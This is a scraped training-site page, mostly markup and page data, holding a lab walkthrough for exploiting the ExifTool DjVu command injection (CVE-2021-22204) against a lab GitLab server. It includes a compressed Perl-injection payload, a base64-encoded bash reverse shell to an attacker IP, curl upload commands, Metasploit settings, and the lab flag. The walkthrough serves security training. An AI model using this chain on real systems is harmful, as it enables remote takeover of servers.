href="https://packetstormsecurity.com/files/164994/GitLab-13.10.2-Remote-Code-Execution.html"><u>PoC</u></a></p></div></li><li><div><p><a title="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22204" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22204"><u>CVE-2021-22204</u></a></p></div></li></ol><p><em>Try this exploit for yourself! </em><a rel="noopener ugc nofollow" class="au kd" target='_blank' title="https://ine.com/pricing" href="https://ine.com/pricing"><em>Subscribe</em></a> or <em>sign up for a┬á</em><a target='_blank' title="https://checkout.ine.com/free-trial" href="https://checkout.ine.com/free-trial"><em>7-day, risk-free trial with INE</em></a><em> to access this lab and a robust library covering the latest in Cyber Security, Networking, Cloud, and Data Science!</em></p></div></div><div class="styles_socialShare__Pha4P"><p>Share this post with your network</p><div class="styles_iconsContainer__f8UXm"><a href="https://x.com/intent/tweet?text=Discover+%22ExifTool+Command+Injection+%28CVE-2021-22204%29%22+on+the+INE+post&amp;url=https%3A%2F%2Fine.com%2Fblog%2Fexiftool-command-injection-cve-2021-22204" role="button" rel="noreferrer noopener" target="_blank" class="styles_socialLink__7rGbs"><img alt="twitter Logo" loading="lazy" width="50" height="50" decoding="async" data-nimg="1" style="color:transparent" src="/assets/icons/ic_x.svg"/></a><a href="https://www.facebook.com/sharer/sharer.php?quote=Discover+%22ExifTool+Command+Injection+%28CVE-2021-22204%29%22+on+the+INE+post&amp;u=https%3A%2F%2Fine.com%2Fblog%2Fexiftool-command-injection-cve-2021-22204" role="button" rel="noreferrer noopener" target="_blank" class="styles_socialLink__7rGbs"><img alt="facebook Logo" loading="lazy" width="50" height="50" decoding="async" data-nimg="1" style="color:transparent" src="/assets/icons/ic_facebook.svg"/></a><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fine.com%2Fblog%2Fexiftool-command-injection-cve-2021-22204" role="button" rel="noreferrer noopener" target="_blank" class="styles_socialLink__7rGbs"><img alt="linkedin Logo" loading="lazy" width="50" height="50" decoding="async" data-nimg="1" style="color:transparent" src="/assets/icons/ic_linkedin.svg"/></a><a href="https://api.whatsapp.com/send?text=Discover%20%22ExifTool%20Command%20Injection%20(CVE-2021-22204)%22%20on%20the%20INE%20post%0A%0Ahttps%3A%2F%2Fine.com%2Fblog%2Fexiftool-command-injection-cve-2021-22204" role="button" rel="noreferrer noopener" target="_blank" class="styles_socialLink__7rGbs"><img alt="whatsapp Logo" loading="lazy" width="50" height="50" decoding="async" data-nimg="1" style="color:transparent" src="/assets/icons/ic_whatsapp.svg"/></a><a href="mailto:?subject=ExifTool%20Command%20Injection%20(CVE-2021-22204)&amp;body=Discover%20%22ExifTool%20Command%20Injection%20(CVE-2021-22204)%22%20on%20the%20INE%20post%0A%0Ahttps%3A%2F%2Fine.com%2Fblog%2Fexiftool-command-injection-cve-2021-22204" role="button" rel="noreferrer noopener" target="_blank" class="styles_socialLink__7rGbs"><img alt="email Logo" loading="lazy" width="50" height="50" decoding="async" data-nimg="1" style="color:transparent" src="/assets/icons/ic_email.svg"/></a></div></div></div></section></section></main><footer id="footer" class="styles_footer__KoQ2V"><div class="styles_contentWrapper__tfpeg styles_footerContentWrapper__PF_ms"><nav class="styles_footerNav__hSKwh"><div class="styles_navItemGroup__HFD5i"><span class="text styles_navItemGroupTitle__4L0v3">About</span><ul><li class="styles_navItem__U3yBv"><a class="text styles_navLink__QqbK9" href="/about-us"><span role="button">About Us</span></a></li><li class="styles_navItem__U3yBv"><a class="text styles_navLink__QqbK9" href="/contact-us"><span role="button">Contact Us</span></a></li><li class="styles_navItem__U3yBv"><a class="text styles_navLink__QqbK9" href="/careers"><span role="button">Careers</span></a></li><li class="styles_navItem__U3yBv"><a role="button" target="_blank" rel="noopener noreferrer" aria-label="Become An Instructor - Link opens in a new tab" class="text styles_navLink__QqbK9" title="Opens in new tab" href="https://learn.ine.com/become-an-ine-instructor">Become An Instructor</a></li><li class="styles_navItem__U3yBv"><a role="button" target="_blank" rel="noopener noreferrer" aria-label="Our Platform - Link opens in a new tab" class="text styles_navLink__QqbK9" title="Opens in new tab" href="https://my.ine.com/">Our Platform</a></li><li class="styles_navItem__U3yBv"><a role="button" target="_blank" rel="noopener noreferrer" aria-label="Community - Link opens in a new tab" class="text styles_navLink__QqbK9" title="Opens in new tab" href="https://community.ine.com/">Community</a></li><li class="styles_navItem__U3yBv"><a class="text styles_navLink__QqbK9" href="/webcasts"><span role="button">Webcasts</span></a></li><li class="styles_navItem__U3yBv"><a class="text styles_navLink__QqbK9" href="/resources"><span role="button">Newsroom</span></a></li><li class="styles_navItem__U3yBv"><a class="text styles_navLink__QqbK9" href="/resources"><span role="button">Blog</span></a></li></ul></div><div class="styles_navItemGroup__HFD5i"><span class="text styles_navItemGroupTitle__4L0v3">Learning</span><ul><li class="styles_navItem__U3yBv"><a class="text styles_navLink__QqbK9" href="/why-ine"><span role="button">Why INE?</span></a></li><li class="styles_navItem__U3yBv"><a role="button" target="_blank" rel="noopener noreferrer" aria-label="Networking - Link opens in a new tab" class="text styles_navLink__QqbK9" title="Opens in new tab" href="https://my.ine.com/area/7b1b3b7b-1b3b-4b1b-8b1b-9b1b3b1b3b1b">Networking</a></li><li class="styles_navItem__U3yBv"><a role="button" target="_blank" rel="noopener noreferrer" aria-label="Cybersecurity - Link opens in a new tab" class="text styles_navLink__QqbK9" title="Opens in new tab" href="https://my.ine.com/area/3e1aa06f-2e9f-4789-b50d-aa027ad8dcfa">Cybersecurity</a></li><li class="styles_navItem__U3yBv"><a role="button" target="_blank" rel="noopener noreferrer" aria-label="Data Science - Link opens in a new tab" class="text styles_navLink__QqbK9" title="Opens in new tab" href="https://my.ine.com/area/db4652c5-2a80-4be8-a8f1-8852cf0e5230">Data Science</a></li><li class="styles_navItem__U3yBv"><a role="button" target="_blank" rel="noopener noreferrer" aria-label="Cloud - Link opens in a new tab" class="text styles_navLink__QqbK9" title="Opens in new tab" href="https://my.ine.com/area/d3f82c70-f4e7-428e-afd7-4b1d28988e18">Cloud</a></li><li class="styles_navItem__U3yBv"><a role="button" target="_blank" rel="noopener noreferrer" aria-label="Learning Paths - Link opens in a new tab" class="text styles_navLink__QqbK9" title="Opens in new tab" href="https://my.ine.com/search?content_type=learning-path">Learning Paths</a></li><li class="styles_navItem__U3yBv"><a role="button" target="_blank" rel="noopener noreferrer" aria-label="Courses - Link opens in a new tab" class="text styles_navLink__QqbK9" title="Opens in new tab" href="https://my.ine.com/">Courses</a></li><li class="styles_navItem__U3yBv"><a class="text styles_navLink__QqbK9" href="/learning/instructors"><span role="button">Instructors</span></a></li></ul></div><div class="styles_navItemGroup__HFD5i"><span class="text styles_navItemGroupTitle__4L0v3">Plans</span><ul><li class="styles_navItem__U3yBv"><a role="button" target="_blank" rel="noopener noreferrer" aria-label="Pricing &amp; Plans - Link opens in a new tab" class="text styles_navLink__QqbK9" title="Opens in new tab" href="https://checkout.ine.com/">Pricing &amp; Plans</a></li><li class="styles_navItem__U3yBv"><a class="text styles_navLink__QqbK9" href="/enterprise"><span role="button">Enterprise</span></a></li></ul></div><div class="styles_navItemGroup__HFD5i"><span class="text styles_navItemGroupTitle__4L0v3">Support</span><ul><li class="styles_navItem__U3yBv"><a class="text styles_navLink__QqbK9" href="/faqs"><span role="button">Help Center</span></a></li></ul></div></nav><div class="styles_footerForm__4FYh_"><div class="styles_container__Hix28"><h2 class="styles_title__hmWGF">Need training for your entire team?</h2><a class="button button--primary styles_button__cVauT" target="_blank" rel="noopener noreferrer" title="Opens in new tab" href="https://learn.ine.com/schedule-a-demo">Schedule a Demo</a></div><div class="styles_container__OZigC"><div class="styles_textContainer__HqaD4"><h2>DonΓÇÖt miss an update from INE. Join our email list today.</h2></div><div><div id="hubspotFooterForm" class="hs-form-frame"></div></div></div></div></div></footer><div class="styles_bottomBanner__mzimD"><div class="styles_contentWrapper__tfpeg styles_bottomBannerContentWrapper__zzBtD"><div class="styles_footerLegals__CZHDQ"><span class="text styles_copyright__BjkHm">┬⌐ 2025 INE. All Rights Reserved. 
All logos, trademarks and registered trademarks are the property of their respective owners.</span><div class="styles_legalLinkList__6swLV"><a class="text styles_legalLink__KnPoJ" href="/terms-of-service"><span role="button">Terms of service</span></a><a class="text styles_legalLink__KnPoJ" href="/privacy-policy"><span role="button">Privacy policy</span></a></div></div><div class="styles_footerSocials__r2NVi"><a href="https://www.instagram.com/inetraining" role="button" rel="noreferrer noopener" target="_blank" class="styles_socialLink__ZlZHw"><img alt="instagram Logo" loading="lazy" width="50" height="50" decoding="async" data-nimg="1" style="color:transparent" src="/assets/icons/ic_instagram.svg"/></a><a href="https://www.facebook.com/inetraining" role="button" rel="noreferrer noopener" target="_blank" class="styles_socialLink__ZlZHw"><img alt="facebook Logo" loading="lazy" width="50" height="50" decoding="async" data-nimg="1" style="color:transparent" src="/assets/icons/ic_facebook.svg"/></a><a href="https://x.com/ine" role="button" rel="noreferrer noopener" target="_blank" class="styles_socialLink__ZlZHw"><img alt="x Logo" loading="lazy" width="50" height="50" decoding="async" data-nimg="1" style="color:transparent" src="/assets/icons/ic_x.svg"/></a><a href="https://www.linkedin.com/company/inetraining" role="button" rel="noreferrer noopener" target="_blank" class="styles_socialLink__ZlZHw"><img alt="linkedin Logo" loading="lazy" width="50" height="50" decoding="async" data-nimg="1" style="color:transparent" src="/assets/icons/ic_linkedin.svg"/></a><a href="https://www.youtube.com/user/INEtraining" role="button" rel="noreferrer noopener" target="_blank" class="styles_socialLink__ZlZHw"><img alt="youtube Logo" loading="lazy" width="50" height="50" decoding="async" data-nimg="1" style="color:transparent" src="/assets/icons/ic_youtube.svg"/></a></div></div></div></div><div data-rht-toaster="" style="position:fixed;z-index:9999;top:16px;left:16px;right:16px;bottom:16px;pointer-events:none"></div><div class="styles_container__eekmm styles_modal-close__ea2Cu"><div class="styles_innerContainer__m2Q41"><button class="styles_closeModal__XoXbQ"><img src="/assets/icons/cross-black-icon.svg" alt="Cross Close Icon"/></button><div></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"metadata":{"title":"ExifTool Command Injection (CVE-2021-22204)","description":"This exercise is to understand how to exploit the vulnerable ExifTool utility using the malicious file.┬á"},"blogPostsById":{"id":"cl89ufgwlio4p0ck11twa5tqu","stage":"PUBLISHED","author":"INE","createdAt":"2022-09-20T06:56:50.508139+00:00","featuredImage":{"id":"cl89uh8xnipz40ck1qe6rez7a","stage":"PUBLISHED","updatedAt":"2022-09-20T06:58:13.494275+00:00","handle":"gsAwx7B3Rj6BZUQxD95y","fileName":"ExifTool.png","mimeType":"image/png","width":800,"height":800,"size":387154,"url":"https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/gsAwx7B3Rj6BZUQxD95y"},"metaDescription":"This exercise is to understand how to exploit the vulnerable ExifTool utility using the malicious file.┬á","postBody":{"text":"In our lab walkthrough series, we go through selected lab exercises on our┬áINE Platform. \\nSubscribe\\n or \\nsign up for a┬á\\n7-day, risk-free trial with INE\\n and access this lab and a robust library covering the latest in Cyber Security, Networking, Cloud, and Data Science!\\nPurpose:┬á\\nWe are learning how to manually exploit the Gitlab server running the ExifTool vulnerable version to better understand the vulnerability. Also, we will use Metasploit Framework to generate a malicious image that gives us a meterpreter session.\\nTechnical difficulty:┬á\\nBeginner\\nIntroduction\\nIn 2021, a critical vulnerability was found in the ExifTool tool. The ExifTool is used in many significant applications such as Gitlab. Gitlab uses this tool as a dependency for their product. One issue in the Gitlab lab was exploited due to a vulnerability found in the ExifTool tool. Improper neutralization of user data in the DjVu file format in ExifTool versions 7.44 and up allows arbitrary code execution when parsing the malicious image. Many python scripts and a Metasploit module are available to generate the malicious image file.\\nThe vulnerability severity base score is┬á\\n7.8\\n.\\nIn this lab, we targeted the Gitlab server, where the git server was not correctly validating image files passed to a file parser, resulting in remote command execution.\\nThe CVE assigned to this vulnerability is\\n CVE-2021-22204\\n.\\nLab Environment\\nIn this lab environment, the user will access a Kali GUI instance. A vulnerable machine GitLab server deployed on http://demo.ine.local.┬á\\nGoal after completing this scenario:\\n Exploit the Gitlab server using a malicious .jpg image and gain the shell. Then read the flag.\\n\\nTools\\nThe best tools for this lab are:\\n- Nmap\\n- Bash Shell\\n- ExifTool\\n- Metasploit Framework\\nLab Link:┬á\\nhttps://my.ine.com/INE/courses/ebd09929/cyber-security-vulnerabilities-training-library/lab/4519c8c3-a525-48d6-bf74-6ea5701bfc48\\n┬á\\n\\nPlease go ahead ONLY if you have COMPLETED the lab or you are stuck! Checking the solutions before actually trying the concepts and techniques you studied in the course will dramatically reduce the benefits of a hands-on lab!\\nWhat is GitLab?\\nGitLab Community Edition (CE) is an open-source end-to-end software development platform with built-in version control, issue tracking, code review, CI/CD, and more. Self-host GitLab CE on your own servers, in a container, or on a cloud provider.\\nOn April 14, 2021, GitLab published a security release to address CVE-2021-22205, a critical remote code execution vulnerability in the service's web interface. At the time, GitLab described the issue as an authenticated vulnerability that was the result of passing user-provided images to the service's embedded version of ExifTool. A remote attacker could execute arbitrary commands as the git user due to ExifTool's mishandling of DjVu files, an issue that was later assigned CVE-2021-22204.\\nIn this lab, we are focused on exploiting\\n CVE-2021-22204\\nAffected products\\nGitLab's April 2021 advisory affects all versions of both GitLab Enterprise Edition (EE) and GitLab Community Edition (CE) starting from 11.9. The vulnerability was patched in the following versions:\\n- 13.10.3\\n- 13.9.6\\n- 13.8.8\\nSource:┬á\\nhttps://attackerkb.com/topics/D41jRUXCiJ/cve-2021-22205/rapid7-analysis?referrer=activityFeed\\nWhat is ExifTool?\\nExifTool is a free and open-source software program for reading, writing, and manipulating image, audio, video, and PDF metadata. It is platform-independent, available as both a Perl library (Image::ExifTool) and command-line application. ExifTool is commonly incorporated into different types of digital workflows and supports many types of metadata including Exif, IPTC, XMP, JFIF, GeoTIFF, ICC Profile, Photoshop IRB, FlashPix, AFCP and ID3, as well as the manufacturer-specific metadata formats of many digital cameras.\\nSource\\n: https://en.wikipedia.org/wiki/ExifTool\\nWhat is Djvu?\\nDjvu is a computer file format designed primarily to store scanned documents, especially those containing a combination of text, line drawings, indexed color images, and photographs. It uses technologies such as image layer separation of text and background/images, progressive loading, arithmetic coding, and lossy compression for bitonal (monochrome) images. This allows high-quality, readable images to be stored in a minimum of space, so that they can be made available on the web.\\nSource:\\n https://en.wikipedia.org/wiki/DjVu\\nFor vulnerability analysis, we highly recommend you to please refer to this blog post written by [convisoappsec](https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/)\\nSolution\\nStep 1:\\n Open the lab link to access the Kali machine.\\nKali machine\\n\\nStep 2:\\n Check if the provided machine/domain is reachable.\\nCommand\\nping -c 4 demo.ine.local\\n\\nThe provided machine is reachable, and we also found the target's IP address.\\nStep 3:┬á\\nCheck all open ports on the machine.\\nCommand\\nnmap demo.ine.local\\n\\nMultiple ports are open. The GitLab server is running on port 80.\\nStep 4:┬á\\nRun the firefox browser and access port 80 to identify the GitLab server.\\nURL:\\n http://demo.ine.loca\\n\\n\nThe target is running the Gitlab server.\\n\\nExploiting Manually\\nStep 5:\\n \\nWe will manually exploit the vulnerability by generating the malicious .jpg image.\\nTo trigger the vulnerable function, we need to create a valid DjVu file that contains an annotation chunk with the payload that will be executed by the eval function as Perl code. To create this valid DjVu file, we used the tool djvumake , from the [djvulibre](http://djvu.sourceforge.net/) toolkit. A toolkit for DjVu file manipulation. We will also use the tool bzz to compress our payload, then it will not be easily visible in the DjVu file. (in case someone try to inspect it)\\nSource: https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/\\nWe will generate a malicious .jpg file on the Kali machine. A vulnerable ExifTool application is installed on the Kali machine to understand how the exploit/vulnerability is working.┬á\\nFirst, we will try on the Kali machine; then, we will exploit Gitlab, which is using a vulnerable version of ExifTool.┬á\\nCreate a payload file with the below content in it.\\nPayload:\\n (metadata \"\\c${system('id')};\")\\nCommands:\\nnano payload\\ncat payload\\n\\nCompress the payload file to make it non-human-readable\\nCommand:\\nbzz payload payload.bzz\\n\\nMaking .djvu file using djvumake utility.\\nCommand:\\ndjvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz\\nfile exploit.djvu\\nINFO┬á\\n= Anything in the format 'N,N' where N is a number\\nBGjp┬á\\n= Expects a JPEG image, but we can use /dev/null to use nothing as a background image\\nANTz┬á\\n= Will write the compressed annotation chunk with the input file\\n\\nWe have successfully generated the malicious .djvu file that will execute┬á\\nid┬á\\ncommand when someone tries to analyze it with the ExifTool tool.\\nWe are running ExifTool to check the malicious file behavior.\\nCommand:\\nexiftool exploit.djvu┬á\\n\\nAs we can notice, we have successfully executed the command id while analyzing the exploit.djvu file using the ExifTool tool. This confirms that ExifTool version 12.23 is vulnerable to Command Injection vulnerability.\\nStep 6:\\n Let's exploit the GitLab server.\\nWe will again generate another malicious .djvu file. But, this time, we are exploiting the Gitlab server. It doesn't support .djvu format file. We need an image file.┬á\\nWe can easily create a .djvu file to .jgp using the below config file.\\n%Image::ExifTool::UserDefined = (\n┬á┬á┬á┬áAll EXIF tags are added to the Main table, and WriteGroup is used to\n┬á┬á┬á┬áspecify where the tag is written (default is ExifIFD if not specified):\n┬á┬á┬á┬á'Image::ExifTool::Exif::Main' =\u003e {\n┬á┬á┬á┬á┬á┬á┬á┬áExample 1.┬á EXIF:NewEXIFTag\n┬á┬á┬á┬á┬á┬á┬á┬á0xc51b =\u003e {\n┬á┬á┬á┬á┬á┬á┬á┬á┬á┬á┬á┬áName =\u003e 'HasselbladExif',\n┬á┬á┬á┬á┬á┬á┬á┬á┬á┬á┬á┬áWritable =\u003e 'string',\n┬á┬á┬á┬á┬á┬á┬á┬á┬á┬á┬á┬áWriteGroup =\u003e 'IFD0',\n┬á┬á┬á┬á┬á┬á┬á┬á},\n┬á┬á┬á┬á┬á┬á┬á┬áadd more user-defined EXIF tags here...\n┬á┬á┬á┬á},\n);\n1; #end%\\nWhat this file does is make it possible for us to write a new tag on the file with the name HasselbladExif and the bytes 0xc51b to identify it inside our new file. Then we can insert it inside of any file. Then use it and our already made exploit.djvu to insert the malicious DjVu file inside a valid JPEG: https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/\\nGenerating a new .djvu file with Bash reverse shell in it.\\nFirst, let's check the attacker's machine IP address.\\nCommand:\\nip addr\\n\\nThe attacker machine IP address is: 10.10.27.3.\\nNote: In your case, please remember to change the attacker machine IP address\\nBash Reverse Shell: sh -i \u003e\u0026 /dev/tcp/10.10.27.3/4444 0\u003e\u00261\\nFirst, encode the shell in base64 format.\\nCommand:\\necho 'sh -i \u003e\u0026 /dev/tcp/10.10.27.3/4444 0\u003e\u00261' | base64┬á\\n\\nPayload\\n: (metadata \"\\c${system('echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMjcuMy80NDQ0IDA+JjEK | base64 -d | bash')};\")\\nCommand:\\nnano payload\\ncat payload\\nbzz payload payload.bzz\\ndjvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz\\nfile exploit.djvu\\n\\nNow, converting the .djvu file into .jgp\\nCommand:\\ncat configfile\\ncp /usr/share/wallpaper.jpg .\\nexiftool -config configfile '-HasselbladExif\u003c=exploit.djvu' wallpaper.jpg\\nconfigfile = The name of our configuration file;\\n-HasselbladExif = Tag name that are specified in the config file;\\nexploit.djvu = Our exploit, previously made with djvumake;\\nwallpaper.jpg = A valid JPEG file;\\n\\nStart the netcat listener on port 4444\\nCommand:\\nnc -lvp 4444\\n\\nSend the payload to gain the bash shell.\\nCommand:\\ncurl -v -F 'file=@/root/wallpaper.jpg' http://demo.ine.local/$(openssl rand -hex 8)\\n\\n\\n\\nWe have received a shell.\\nSource:┬á\\nhttps://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/\\n\\nExploiting Using Metasploit\\nStep 7:\\n Metasploit module is available to generate the malicious image. Use the module to generate the malicious image and exploit the Gitlab server manually using curl.\\nStart the Metasploit framework and search for the ExifTool exploit module.\\nCommand:\\nmsfconsole -q\\nsearch exiftool\\n\\nThere is a metasploit module available:┬á\\nexploit/unix/fileformat/exiftool_djvu_ant_perl_injection\\nExifTool DjVu ANT Perl injection\\nThis module exploits a Perl injection vulnerability in the DjVu ANT parsing code of ExifTool versions 7.44 through 12.23 inclusive. The injection is used to execute a shell command using Perl backticks. The DjVu image can be embedded in a wrapper image using the HasselbladExif EXIF field.\\nSource:┬á\\nhttps://www.rapid7.com/db/modules/exploit/unix/fileformat/exiftool_djvu_ant_perl_injection/\\nFor more understanding about the ExifTool CVE-2021-22204 - Arbitrary Code Execution: Here is an excellent blog post by [William Bowling](https://twitter.com/wcbowling): https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html\\nUse the exiftool_djvu_ant_perl_injection exploit module and check all available options.\\nCommands:\\nuse exploit/unix/fileformat/exiftool_djvu_ant_perl_injection\\nshow options\\nAll the options are already set. Start the Metasploit handler while generating the malicious image.\\nSet┬á\\nDISABLEPAYLOADHANDLER┬á\\nto┬á\\nfalse,┬á\\nset┬á\\nWfsDelay┬á\\nto┬á\\n100,┬á\\nand then run the module.\\n\\nCheck the file details.\\nCommands:\\nset PAYLOAD cmd/unix/reverse_bash\\nset DISABLEPAYLOADHANDLER false\\nset WfsDelay 100\\nexploit\\nThe image is generated in the /root/.msf4/local/msf.jpg. It's a JPEG image data with Exif standard.\\n\\nNote: Make sure that your Metasploit handler is running\\nSend the payload to gain the meterpreter session.\\nCommand:\\ncurl -v -F 'file=@/root/.msf4/local/msf.jpg' http://demo.ine.local/$(openssl rand -hex 8)\\n\\nReceived the meterpreter session.\\n\\nSuccessfully exploited the target machine.\\nStep 8:┬á\\nRead the flag.\\nCommands:\\ncd ..\\nls\\ncat flag.txt\\n\\nFLAG:┬á\\n7e9b2ed1272331cfbd2aac2e5eb3f84b\\nConclusion:\\nWe have successfully exploited the Gitlab server abusing exiftoolΓÇÖs vulnerability (ExifToolΓÇÖs mishandling of DjVu files) that allows an attacker to perform a command injection using a malicious image. Gitlab was not correctly validating image files that were passed to a file parser; hence, it is possible to exploit the vulnerability.┬á\\nReferences\\n\\nExifTool\\n\\n\\nGitLab\\n\\n\\nPoC\\n\\n\\nCVE-2021-22204\\n\\nTry this exploit for yourself! \\nSubscribe\\n or \\nsign up for a┬á\\n7-day, risk-free trial with INE\\n to access this lab and a robust library covering the latest in Cyber Security, Networking, Cloud, and Data Science!","html":"\u003cp\u003e\u003cem\u003eIn our lab walkthrough series, we go through selected lab exercises on our┬áINE Platform. \u003c/em\u003e\u003ca rel=\"noopener ugc nofollow\" class=\"au kd\" target='_blank' title=\"https://ine.com/pricing\" href=\"https://ine.com/pricing\"\u003e\u003cem\u003eSubscribe\u003c/em\u003e\u003c/a\u003e or \u003cem\u003esign up for a┬á\u003c/em\u003e\u003ca target='_blank' title=\"https://checkout.ine.com/free-trial\" href=\"https://checkout.ine.com/free-trial\"\u003e\u003cem\u003e7-day, risk-free trial with INE\u003c/em\u003e\u003c/a\u003e\u003cem\u003e and access this lab and a robust library covering the latest in Cyber Security, Networking, Cloud, and Data Science!\u003c/em\u003e\u003c/p\u003e\u003cp\u003e\u003cstrong\u003ePurpose:┬á\u003c/strong\u003eWe are learning how to manually exploit the Gitlab server running the ExifTool vulnerable version to better understand the vulnerability. Also, we will use Metasploit Framework to generate a malicious image that gives us a meterpreter session.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eTechnical difficulty:┬á\u003c/strong\u003eBeginner\u003c/p\u003e\u003ch4\u003e\u003cstrong\u003eIntroduction\u003c/strong\u003e\u003c/h4\u003e\u003cp\u003eIn 2021, a critical vulnerability was found in the ExifTool tool. The ExifTool is used in many significant applications such as Gitlab. Gitlab uses this tool as a dependency for their product. One issue in the Gitlab lab was exploited due to a vulnerability found in the ExifTool tool. Improper neutralization of user data in the DjVu file format in ExifTool versions 7.44 and up allows arbitrary code execution when parsing the malicious image. Many python scripts and a Metasploit module are available to generate the malicious image file.\u003c/p\u003e\u003cp\u003eThe vulnerability severity base score is┬á\u003cstrong\u003e7.8\u003c/strong\u003e.\u003c/p\u003e\u003cp\u003eIn this lab, we targeted the Gitlab server, where the git server was not correctly validating image files passed to a file parser, resulting in remote command execution.\u003c/p\u003e\u003cp\u003eThe CVE assigned to this vulnerability is\u003cstrong\u003e CVE-2021-22204\u003c/strong\u003e.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eLab Environment\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eIn this lab environment, the user will access a Kali GUI instance. A vulnerable machine GitLab server deployed on http://demo.ine.local.┬á\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eGoal after completing this scenario:\u003c/strong\u003e Exploit the Gitlab server using a malicious .jpg image and gain the shell. Then read the flag.\u003c/p\u003e\u003cimg src=\"https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/3RWR21RSxaBwfLxdvBqU\" alt=\"ExifTool_0.png\" title=\"ExifTool_0.png\" width=\"862\" height=\"361\" /\u003e\u003cp\u003e\u003cstrong\u003eTools\u003c/strong\u003e\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eThe best tools for this lab are:\u003c/strong\u003e\u003c/p\u003e\u003cp\u003e- Nmap\u003c/p\u003e\u003cp\u003e- Bash Shell\u003c/p\u003e\u003cp\u003e- ExifTool\u003c/p\u003e\u003cp\u003e- Metasploit Framework\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eLab Link:┬á\u003c/strong\u003e\u003ca title=\"https://my.ine.com/INE/courses/ebd09929/cyber-security-vulnerabilities-training-library/lab/4519c8c3-a525-48d6-bf74-6ea5701bfc48\" href=\"https://my.ine.com/INE/courses/ebd09929/cyber-security-vulnerabilities-training-library/lab/4519c8c3-a525-48d6-bf74-6ea5701bfc48\"\u003e\u003cu\u003e\u003cstrong\u003ehttps://my.ine.com/INE/courses/ebd09929/cyber-security-vulnerabilities-training-library/lab/4519c8c3-a525-48d6-bf74-6ea5701bfc48\u003c/strong\u003e\u003c/u\u003e\u003c/a\u003e\u003cstrong\u003e┬á\u003c/strong\u003e\u003c/p\u003e\u003cimg src=\"https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/pOX942EbTASlP8iCdgXa\" alt=\"ExifTool_0_1.jpg\" title=\"ExifTool_0_1.jpg\" width=\"1920\" height=\"961\" /\u003e\u003cp\u003ePlease go ahead ONLY if you have COMPLETED the lab or you are stuck! Checking the solutions before actually trying the concepts and techniques you studied in the course will dramatically reduce the benefits of a hands-on lab!\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eWhat is GitLab?\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eGitLab Community Edition (CE) is an open-source end-to-end software development platform with built-in version control, issue tracking, code review, CI/CD, and more. Self-host GitLab CE on your own servers, in a container, or on a cloud provider.\u003c/p\u003e\u003cp\u003eOn April 14, 2021, GitLab published a security release to address CVE-2021-22205, a critical remote code execution vulnerability in the service\u0026#39;s web interface. At the time, GitLab described the issue as an authenticated vulnerability that was the result of passing user-provided images to the service\u0026#39;s embedded version of ExifTool. A remote attacker could execute arbitrary commands as the git user due to ExifTool\u0026#39;s mishandling of DjVu files, an issue that was later assigned CVE-2021-22204.\u003c/p\u003e\u003cp\u003eIn this lab, we are focused on exploiting\u003cstrong\u003e CVE-2021-22204\u003c/strong\u003e\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eAffected products\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eGitLab\u0026#39;s April 2021 advisory affects all versions of both GitLab Enterprise Edition (EE) and GitLab Community Edition (CE) starting from 11.9. The vulnerability was patched in the following versions:\u003c/p\u003e\u003cp\u003e- 13.10.3\u003c/p\u003e\u003cp\u003e- 13.9.6\u003c/p\u003e\u003cp\u003e- 13.8.8\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eSource:┬á\u003c/strong\u003ehttps://attackerkb.com/topics/D41jRUXCiJ/cve-2021-22205/rapid7-analysis?referrer=activityFeed\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eWhat is ExifTool?\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eExifTool is a free and open-source software program for reading, writing, and manipulating image, audio, video, and PDF metadata. It is platform-independent, available as both a Perl library (Image::ExifTool) and command-line application. ExifTool is commonly incorporated into different types of digital workflows and supports many types of metadata including Exif, IPTC, XMP, JFIF, GeoTIFF, ICC Profile, Photoshop IRB, FlashPix, AFCP and ID3, as well as the manufacturer-specific metadata formats of many digital cameras.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eSource\u003c/strong\u003e: https://en.wikipedia.org/wiki/ExifTool\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eWhat is Djvu?\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eDjvu is a computer file format designed primarily to store scanned documents, especially those containing a combination of text, line drawings, indexed color images, and photographs. It uses technologies such as image layer separation of text and background/images, progressive loading, arithmetic coding, and lossy compression for bitonal (monochrome) images. This allows high-quality, readable images to be stored in a minimum of space, so that they can be made available on the web.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eSource:\u003c/strong\u003e https://en.wikipedia.org/wiki/DjVu\u003c/p\u003e\u003cp\u003eFor vulnerability analysis, we highly recommend you to please refer to this blog post written by [convisoappsec](https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/)\u003c/p\u003e\u003ch3\u003e\u003cstrong\u003eSolution\u003c/strong\u003e\u003c/h3\u003e\u003cp\u003e\u003cstrong\u003eStep 1:\u003c/strong\u003e Open the lab link to access the Kali machine.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eKali 